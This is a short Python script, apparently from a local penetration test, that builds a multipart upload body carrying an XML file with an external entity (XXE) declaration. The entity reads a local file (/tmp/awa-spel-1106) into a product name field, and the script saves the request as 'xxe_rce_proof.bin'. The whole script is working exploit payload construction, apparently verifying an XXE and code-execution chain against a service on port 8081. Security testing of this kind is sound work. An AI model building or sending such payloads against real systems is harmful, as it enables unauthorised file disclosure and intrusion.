import os
work = r'D:\Backup\Downloads\awa-ddd\work\local-8081-20261106'
xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE products [<!ENTITY proof SYSTEM "file:///tmp/awa-spel-1106">]>
<products>
  <product>
    <name>&proof;</name>
    <price>1.00</price>
    <stock>1</stock>
  </product>
</products>
'''
boundary = '----AWAXXE1106'
parts = []
parts.append(('--' + boundary + '\r\n').encode())
parts.append(b'Content-Disposition: form-data; name="file"; filename="xxe-test.xml"\r\n')
parts.append(b'Content-Type: application/xml\r\n\r\n')
parts.append(xml.encode('utf-8'))
parts.append(('\r\n--' + boundary + '--\r\n').encode())
open(os.path.join(work, 'xxe_rce_proof.bin'), 'wb').write(b''.join(parts))
print('ok')
